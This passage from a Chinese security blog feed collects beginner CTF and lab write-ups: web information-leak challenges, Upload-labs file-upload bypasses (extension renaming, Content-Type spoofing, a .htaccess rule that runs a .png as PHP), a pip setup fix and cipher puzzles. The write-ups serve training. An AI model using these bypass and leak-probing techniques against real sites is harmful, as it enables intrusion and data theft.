System，VCS）是一种软件，可以帮助软件团队的开发人员协同工作，并存档他们工作的完整历史记录-->。 <p> 一般常用的有Git，VSS，SVN等版本，本题所用的便是Git，在网址后面加上&#x2F;.git就能得到flag了</p><h2 id="八、版本控制泄露源码2"><a href="#八、版本控制泄露源码2" class="headerlink" title="八、版本控制泄露源码2"></a>八、版本控制泄露源码2</h2><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211830207.png"></p><p> 根据上题所知，尝试得到本题的版本控制系统是SVN,所以在网站后面加上&#x2F;.svn就可以得到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211830193.png"></p><h2 id="九、vim临时文件泄露"><a href="#九、vim临时文件泄露" class="headerlink" title="九、vim临时文件泄露"></a>九、vim临时文件泄露</h2><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211831001.png"></p><p>从题目找线索，从而来去得到flag 。当vim文件不正常退出时会生成一个.swp临时文件，从而造成文件信息泄露，一般网站编辑文件都是index.php。所以在文件后面加上&#x2F;index.php.swp得到一个swp文件，打开得到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211831994.png"></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211831991.png"></p><h2 id="十、cookie泄露"><a href="#十、cookie泄露" class="headerlink" title="十、cookie泄露"></a>十、cookie泄露</h2><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211831170.png"></p><p>有题目可以得知本题是跟cookie相关的.。要么简单粗暴用BP抓包，直接可以在cookie上看到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211831219.png"></p><p><strong>将%7B%7D编码后就是{}</strong> </p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211832008.png"></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211832001.png"> 或者就是打开浏览器找到cookie同样可以拿到flag<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211832059.png"></p><h2 id="十一-、域名txt记录泄露"><a href="#十一-、域名txt记录泄露" class="headerlink" title="十一 、域名txt记录泄露"></a>十一 、域名txt记录泄露</h2><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211832670.png"></p><p>找到一个在线域名解析记录检测，可以在TXT中找到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211832660.png"></p><h2 id="十二、敏感信息公布"><a href="#十二、敏感信息公布" class="headerlink" title="十二、敏感信息公布"></a>十二、敏感信息公布</h2><p>打开网站是一个购物平台</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211833094.png">不知道从哪下手，然后御剑扫出一个网站+<strong>&#x2F;admin</strong>，后来发现用**&#x2F;robots.txt<strong>也能得到这个网站+</strong>&#x2F;admin**，如图</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211833426.png"></p><p>打开后发现是个登录系统</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211833430.png"></p><p>猜测用户名是admin，密码考虑题目敏感信息公布，猜测可能就在那个网站里，当移到最下面时发现有一串数字，</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211833951.png"></p><p>重新回到登录系统，尝试后登录成功拿到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211833961.png"></p><h2 id="十三、内部技术文档泄露"><a href="#十三、内部技术文档泄露" class="headerlink" title="十三、内部技术文档泄露"></a>十三、内部技术文档泄露</h2><p>本题打开后也是如十二题一样是个网站，尝试像十二题那样查询robots.txt无果，只能从这网站找线索</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211834788.png"></p><p>原本一筹莫展，当翻到网址最下面，发现其”document”可以点击,从中找到线索</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211834603.png"></p><p>document移到最下面的内容为下图</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211834526.png"></p><p>将原本的网站加上&#x2F;system1103&#x2F;login.php进入登录界面，输入默认用户名和密码得到flag。</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211834501.png"></p><h2 id="十四、编辑器配置不当"><a href="#十四、编辑器配置不当" class="headerlink" title="十四、编辑器配置不当"></a>十四、编辑器配置不当</h2><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211834819.png"></p><p>打开后是跟十一、十二关那样是一个页面，但根据题目内的提示，在网站后缀加上&#x2F;editor进入一个新的页面</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211834763.png"></p><p>找到上传文件的地方，进入文件空间，</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211835034.png"></p><p>打开文件空间，依次点击**&#x2F;var&#x2F;www&#x2F;html&#x2F;nothinghere**,从而发现藏在其中的txt文件，</p><p>然后通过在主网址上加上**&#x2F;nothinghere&#x2F;fl000g.txt**找到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211835023.png"></p><h2 id="十五、密码逻辑脆弱"><a href="#十五、密码逻辑脆弱" class="headerlink" title="十五、密码逻辑脆弱"></a>十五、密码逻辑脆弱</h2><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211835198.png"></p><p>仍然是网页，放进御剑里扫一扫，扫出一个admin</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211835060.png"></p><p>进入一看是登录页面，猜测用户名应该是admin，但是密码未知</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211835055.png"></p><p>发现有个忘记密码的按钮，点进去后需要回答密保问题才能得到密码</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211835064.png"></p><blockquote><p>再结合本题所给的提示：公开的信息比如邮箱，可能造成信息泄露，产生严重后果</p></blockquote><p> 返回主网站，找到邮箱，</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211836434.png"></p><p>然后登录自己qq查询该账号，发现其人在西安，返回回答问题，得到密码</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211836432.png"> 然后输入用户名和密码得到flag</p><h2 id="十六、探针泄露"><a href="#十六、探针泄露" class="headerlink" title=" 十六、探针泄露"></a><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211836206.png"> 十六、探针泄露</h2><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211836281.png"> 打开页面就是一个元素周期表，没有任何线索，但是根据题目所给提示，考虑与探针相关</p><blockquote><p>对于测试用的探针，使用完毕后要及时删除，可能会造成信息泄露</p></blockquote><p> 所以在网站后面加上**&#x2F;tz.php**</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211837626.png"></p><p>点击后可以从里面找到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211837606.png"></p><h2 id="十七、CDN穿透"><a href="#十七、CDN穿透" class="headerlink" title="十七、CDN穿透"></a>十七、CDN穿透</h2><p>这题应该是坏了，直接提示把答案发出来了</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211837837.png"> 如果查这个网站的IP地址提交上去的是错误的。</p><h2 id="十八、js敏感信息泄露"><a href="#十八、js敏感信息泄露" class="headerlink" title="十八、js敏感信息泄露"></a>十八、js敏感信息泄露</h2><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211837089.png"></p><p>本题打开后发现是一个小游戏，一般网站小游戏考虑达到一定的分数给出flag，所以查询源代码来看看是否有满足分数条件给flag的代码。发现当分数大于100时会给出一串十六进制编码。</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211837045.png"> 将这十六进制编码进行ascii转换，</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211838810.png"> 所以在主网站的后面加上&#x2F;110.php。得到flag</p><h2 id="十九、前端密钥泄露"><a href="#十九、前端密钥泄露" class="headerlink" title=" 十九、前端密钥泄露"></a><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211838224.png"> 十九、前端密钥泄露</h2><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211838181.png"> 打开后是一个登录页面，查看源代码可以发现一个post<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211838188.png"> 然后在火狐浏览器或者BP中POST传参，得到flag</p><h2 id="二十、数据库恶意下载"><a href="#二十、数据库恶意下载" class="headerlink" title=" 二十、数据库恶意下载"></a><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211838323.png"> 二十、数据库恶意下载</h2><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211838285.png"> 根据题目提示</p><blockquote><p>mdb文件是早期asp+access构架的数据库文件，文件泄露相当于数据库被脱裤了。 </p></blockquote><p>所以在网站后面加入&#x2F;db&#x2F;db.mdb得到一个下载的文件</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211839148.png"></p><p>用notepad++打开查找”flag”找到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211839136.png"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>重写一遍还是受益良多的</p>]]></content>
      
      
      
        <tags>
            
            <tag> web、网安、新手 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Upload-labs靶场(01-06)</title>
      <link href="/2023/04/01/Upload-labs%E9%9D%B6%E5%9C%BA-01-06/"/>
      <url>/2023/04/01/Upload-labs%E9%9D%B6%E5%9C%BA-01-06/</url>
      
        <content type="html"><![CDATA[<p>本博客只是自己当时做题的想法，并未涉及太深，要更深层次了解，还是需要去看看其他大佬的做题思路。</p><h2 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h2><p>首先会发现，如果直接上传php，会提示不让直接上传该图片<br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211019442.png"><br>但是上传图片可以上传，所以放入BP中看看<br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211020395.png"><br>将1.png修改为1.php再发送，<br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211020908.png"><br>再通过靶场查询这个php，上传成功<br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211020662.png"></p><h2 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h2><h3 id="1、修改上传类型"><a href="#1、修改上传类型" class="headerlink" title="1、修改上传类型"></a>1、修改上传类型</h3><p>首先根据源代码可以看到，这是需要确认文件类型<br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211020639.png"><br>所以可以通过用BP去抓个php文件的包，然后将如下图标注的地方进行修改，可以将Content-Type修改为允许上传的类型image&#x2F;jpeg或image&#x2F;png或image&#x2F;gif。<br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211020904.png"><br>修改后发送发现上传成功。<br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211020641.png"><br>访问验证一下<br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211020386.png"></p><h3 id="2、如Pass-1的做法"><a href="#2、如Pass-1的做法" class="headerlink" title="2、如Pass 1的做法"></a>2、如Pass 1的做法</h3><p>先上传图片，然后文件类型就已经变成图片的类型，然后再将图片后缀修改为php，发送。<br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211020938.png"><br><img src="https://img-blog.csdnimg.cn/21c302db6b424a1b8884cd4aa1ea8231.png"></p><h2 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h2><p>首先查看这道题的源代码，发现是黑名单验证<br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211020723.png"><br>且不允许上传.php后缀文件，我这里是将php后缀修改成php5后上传。发现成功上传<br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211020292.png"><br>访问一下<br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211020639.png"><br>详情可以看这位大佬的黑名单绕过，里面不局限于php5后缀，还是有很多修改可以上传。<br><a href="https://blog.csdn.net/qq_25899635/article/details/90344198">大佬博客</a></p><h2 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h2><p>先查看源代码<br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211020418.png"><br>发现很多后缀被禁止上传。所以需要用到.htaccess配置文件，并且在其<br>文件内部写上<br>    &lt;FileMatch”4.png”&gt;<br>    SetHandler application&#x2F;x-httpd-php<br>可以将其中4.png解析为php，在其中写入php代码就行，<br>然后通过BP抓图片包，将其在重发器中发送一下，发现上传成功，访问4.png就行了<br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211021541.png"><br>访问一下，因为我这个浏览器访问会黑屏，所以看源代码<br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211021757.png"></p><h2 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h2><p>从源代码来看和上题一样导致很多文件无法上传，且上题使用的.htaccess文件也被限制了<br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211021860.png"><br>但其中php7文件后缀还可以使用绕过，利用BP抓包并将后缀改为php7，发现上传成功。<br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211021342.png"><br>访问一下<br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211021667.png"></p><h2 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h2><p>这道题可以通过php大小写绕过，先用BP抓住一个php后缀文件的包，然后在重发器将其后缀修改为PHP，发现上传成功<br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211021340.png"><br>访问一下验证。（不知道为什么打到6的适时候浏览网站就无法看到，显示内部浏览器错误，所以这是找的一个大佬的做的结果），其最后结果就是访问后类似这个就说明上传成功了<br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211021871.png"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>做这个时候发现很多自己不会的知识，也从中学习到了很多，希望能慢慢学习，不断进步。</p>]]></content>
      
      
      
        <tags>
            
            <tag> web、靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>解决pythoncharm中关于Crypto的相关问题</title>
      <link href="/2023/02/08/%E8%A7%A3%E5%86%B3pythoncharm%E4%B8%AD%E5%85%B3%E4%BA%8ECrypto%E7%9A%84%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98/"/>
      <url>/2023/02/08/%E8%A7%A3%E5%86%B3pythoncharm%E4%B8%AD%E5%85%B3%E4%BA%8ECrypto%E7%9A%84%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p> 在学习一道rsa题wp中，发现其代码无法在我的PythonCharm中运行并发出报错，报错内容如下：</p><blockquote><p>from Crypto.Util.number import *<br>ImportError: No module named Crypto.Util.number </p></blockquote><p>上网搜索原因是我的pythoncharm中并没有crypto的下载，需要通过pip对其进行下载。于此同时，发现我的pip也无法使用（晕），当我使用pip时给我发出如下的报错：</p><blockquote></blockquote><p>pip : 无法将“pip”项识别为 cmdlet、函数、脚本文件或可运行程序的名称。请检查名称的拼写，如果包括路径，请确保路径正确， 然后再试一次。 所在位置 行:1 字符: 1 + pip ins</p><p>于是我又上网查询一下解决出现这种问题的方法。解决方式如下：<br>一般来说，让我们下载PythonCharm时，pip也已经下载好了，可以通过打开PythonCharm左上角的 文件&#x2F;设置&#x2F;项目&#x2F;Python解释器 找到它。如图：<br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211021780.png"><br>但是如果直接在PythonCharm的终端里面打出:<br>     <code>pip install crypto</code></p><p>就会出现上面我所说的报错， 就是虽然下载了pip，但并未在PythonCharm中配置pip环境，所以无法使用，所以我们需要对pip进行环境配置，第一步是直接在PythonCharm内部进行pip的环境配置，有的人在第一步后就可以使用pip了，但是有的还是会出现pip的报错(比如我)，所以我们还需要对系统进行环境配置，下面是第一步的步骤：</p><p>首先还是打开PythonCharm，找到左上角的  文件&#x2F;设置&#x2F;项目  找到如图所在的位置，并点击红圈标记的地方<br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211021253.png"><br>然后进入环境变量界面，点击 “ + ” <br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211021497.png"><br>名称：Path  值：复制下图中的位置部分<br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211021820.png"><br>应用后重启PythonCharm，然后打开PythonCharm中的终端输入pip，看是否出现如下图的情况<br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211021717.png"><br>如果出现，则说明pip配置成功，如果没有出现该图情况，则进行第二步，对系统环境进行配置，找到电脑中的高级系统设置，点击红圈标注的位置<br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211021146.png"><br>找到系统变量（就是点进去后下面那一处）然后找到其中为Path的变量，双击后点击新建，将刚才复制的地址粘贴上去，然后再次打开PythonCharm就可以使用pip的功能了。</p><p>接下来是关于Crypto的问题，当我输入<br><code>pip install crypto</code>并运行后<br>出现下面的情况</p><blockquote><p>from Crypto.Util.number import *<br>ModuleNotFoundError: No module named ‘Crypto’</p></blockquote><p>上网搜寻原因是因为crypto这个库过时了，现在都是下载pycryptodome<br>下载它的代码是<br><code>pip install crypto pycryptodome</code><br>​<br>详情可以参考这位大佬的CSDN博客<br><a href="https://blog.csdn.net/Ahuuua/article/details/108800712">​https://blog.csdn.net/Ahuuua/article/details/108800712<br>​</a></p><p>总结</p><p>以上便是我解决这些问题中所做的行为，虽然解决了我的问题，但是不能保证解决大家的问题，仅供参考，很多大佬写的远比我这详细，也希望能给大家带来一些帮助。</p><p>​​</p>]]></content>
      
      
      
        <tags>
            
            <tag> 见解，参考，学习。 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SLsec招新赛</title>
      <link href="/2023/01/09/SLsec%E6%8B%9B%E6%96%B0%E8%B5%9B/"/>
      <url>/2023/01/09/SLsec%E6%8B%9B%E6%96%B0%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h2 id="一、熊曰"><a href="#一、熊曰" class="headerlink" title="一、熊曰"></a>一、熊曰</h2><p>从题目看到是一串不知道什么的什么，但根据题目名字，考虑到与熊论道<br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211010239.png"><br>所以通过网上搜寻与熊论道，得到答案<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211010589.png"><br> 链接：<a href="http://hi.pcmoe.net/">熊曰解密</a></p><h2 id="二、这个皮卡丘有点矮"><a href="#二、这个皮卡丘有点矮" class="headerlink" title="二、这个皮卡丘有点矮"></a>二、这个皮卡丘有点矮</h2><p>打开题目得到一个附件是一张皮卡丘图片<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211010243.png">通过图片，考虑到可能是考察图片长短，所以可以通过010改变图片长短来找到答案<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211010696.png"><br>最终得到flag，就在皮卡丘的脚下<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211010268.png"></p><h2 id="三、vivo50"><a href="#三、vivo50" class="headerlink" title="三、vivo50"></a>三、vivo50</h2><p>本题所给附件是一个pdf文件，打开后发现是一张图片，没有线索，不过可以通过pdf文件中的，如下图找到flag<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211010815.png"></p><h2 id="四、你是lsp吗"><a href="#四、你是lsp吗" class="headerlink" title="四、你是lsp吗"></a>四、你是lsp吗</h2><p>本题附件是一张图片，通过010查询没有什么问题，通过stegsolve中的data extract发现里面还有一张图片，得到一张二维码<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211010214.png"><br>通过扫描二维码得到一串base字符<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211010712.png"><br>通过base32解密得到flag<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211010130.png"><br>base32解密链接：<a href="https://ctf.bugku.com/tool/base32">base32</a></p><h2 id="五、起风了"><a href="#五、起风了" class="headerlink" title="五、起风了"></a>五、起风了</h2><p>本题附件图片是一串看不懂的字符，拖到010试试<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211010918.png"><br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211010333.png"><br>得到一串代码，看着像base解密，通过base解密得到一句英语<img src="https://img-blog.csdnimg.cn/a81ea7619c214581b692e34ae5354921.png"><br>网上英语翻译知道其意思<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211011195.png">上网搜索提瓦特解密得到以下内容<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211011911.png"><br>得到flag：SLsec{yuanlainishiop}</p><h2 id="六、你会相信PDD吗？"><a href="#六、你会相信PDD吗？" class="headerlink" title="六、你会相信PDD吗？"></a>六、你会相信PDD吗？</h2><p>打开压缩包发现图片被加密了，<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211011817.png"><br>考虑到没有任何密码提示，有可能是压缩包伪加密，通过010修改得到图片<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211011334.png"><br>发现是一张二维码但缺失一个定位角，下面有俩种方法。第一种方法、通过ps技术找到一个二维码定位角角补齐二维码通过扫描得到答案。第二种方法、通过CQR得到二维码藏的东西<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211011084.png"><br>通过内容考虑栅栏密码，得到flag<img src="https://img-blog.csdnimg.cn/abad0cd0fd40457ab72fde28014e82c9.png"></p><h2 id="七、情报员CPU"><a href="#七、情报员CPU" class="headerlink" title="七、情报员CPU"></a>七、情报员CPU</h2><p>打开附件发现是一个加密压缩包，<br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211011626.png"><br>打开passwd1<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211011887.png"><br>可以考虑干支解密，通过<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211011509.png"><br>对照得到密码，打开第二个压缩包也是加密的，打开passwd2<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211011994.png"><br>看出是核心价值观编码<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211011069.png"><br>打开第二个压缩包得到一张图片<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211011889.png"><br>得到CPU带来的秘密图片通过010看到藏着一串数字，考虑ascii码加密<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211011979.png"><br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211011956.png">得到flag，结果用SLsec{}包装<br>链接:<a href="https://ctf.bugku.com/tool/cvecode">核心价值观编码</a></p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h2 id="一、签到"><a href="#一、签到" class="headerlink" title="一、签到"></a>一、签到</h2><p>通过网页捕获找到这个flag<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211011984.png"><br>再通过保存图片，通过网上图片文字提取得到flag<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211011958.png"></p><h2 id="二、Robots"><a href="#二、Robots" class="headerlink" title="二、Robots"></a>二、Robots</h2><p>通过robots网上可得知爬虫协议，即将网站后面加上&#x2F;robots，如图<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211012570.png"><br>再通过此修改得到flag<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211012048.png"></p><h2 id="三、PHP01"><a href="#三、PHP01" class="headerlink" title="三、PHP01"></a>三、PHP01</h2><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211012230.png"><br>根据对此分析得到get应传的参，如图所示，得到flag。<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211012518.png"></p><h2 id="四、PHP02"><a href="#四、PHP02" class="headerlink" title="四、PHP02"></a>四、PHP02</h2><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211012693.png">首先这题提示只要访问flag.php就能得到答案，但是如果你单纯输出flag.php会出现如下图的情况<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211012756.png">所以可以从中得到规律，进行以下的修改，得到flag<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211012269.png"></p><h2 id="CPYPTO"><a href="#CPYPTO" class="headerlink" title="CPYPTO"></a>CPYPTO</h2><h2 id="一、base家族"><a href="#一、base家族" class="headerlink" title="一、base家族"></a>一、base家族</h2><p>打开附件得到一串码，根据题目，考虑base解密<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211012305.png"><br>考虑到可能是base的层层加密<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211012449.png"><br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211012170.png"><br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211012548.png"><br>工具链接:<a href="https://ctf.bugku.com/tools">https://ctf.bugku.com/tools</a></p><h2 id="二、O欢迎来到SLsec！，ok"><a href="#二、O欢迎来到SLsec！，ok" class="headerlink" title="二、O欢迎来到SLsec！，ok"></a>二、O欢迎来到SLsec！，ok</h2><p>打开文本得到一堆重复乱码，<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211012161.png"><br>根据题目考虑到ook解密，将SLsec改成Ook后得到flag<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211013162.png"><br>ook解密链接:<a href="https://ctf.bugku.com/tool/brainfuck">https://ctf.bugku.com/tool/brainfuck</a></p><h2 id="三、小兔兔找朋友"><a href="#三、小兔兔找朋友" class="headerlink" title="三、小兔兔找朋友"></a>三、小兔兔找朋友</h2><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211012922.png"><br>此题要根据题目来做，首先是小兔子过生日，当天为光棍节，所以密钥为1111，通过兔兔想到兔子解密，兔子解密后栅栏数为三的栅栏解密以及最后的凯撒解密得到答案，步骤如下<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211012392.png"><br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211012918.png"><br><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211013703.png"><br>RABBIT解密链接:<a href="https://www.codeeeee.com/encrypt/rabbit.html">https://www.codeeeee.com/encrypt/rabbit.html</a></p><h2 id="四、MD5解密"><a href="#四、MD5解密" class="headerlink" title="四、MD5解密"></a>四、MD5解密</h2><p>该题是通过一串代码得到的答案，<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211013584.png"><br>再用SLsec包装即是答案。</p><p>源代码：</p><pre class="line-numbers language-none"><code class="language-none">import hashlib#print hashlib.md5(s).hexdigest().upper()&#96;k &#x3D; &#39;SLsec&#123;md5&amp;zd&amp;mj&amp;m&#125;&#39;for i in range(26):    temp1 &#x3D; k.replace(&#39;&amp;&#39;,str(chr(97+i)),1) #用ascii开始，从A开始查    for j in range(26):        temp2 &#x3D; temp1.replace(&#39;&amp;&#39;,chr(97+j),1)        for n in range(26):&#96;&#96;            temp3 &#x3D; temp2.replace(&#39;&amp;&#39;,chr(97+n),1)            s &#x3D; hashlib.md5(temp3.encode(&#39;utf8&#39;)).hexdigest().upper()#注意大小写            if s[:32] &#x3D;&#x3D; &#39;D1ABA2C785779AFFFBEC56422DBF23F2&#39;:#检查元素                print(temp3)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>源代码链接：<a href="https://blog.csdn.net/emmmk_suibian/article/details/123693217">https://blog.csdn.net/emmmk_suibian&#x2F;article&#x2F;details&#x2F;123693217</a></p><h2 id="RESERVE"><a href="#RESERVE" class="headerlink" title="RESERVE"></a>RESERVE</h2><h2 id="一、re签到"><a href="#一、re签到" class="headerlink" title="一、re签到"></a>一、re签到</h2><p>将附件放入ida就能找到答案<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304211013050.png"></p><h2 id="二、JustCaesar"><a href="#二、JustCaesar" class="headerlink" 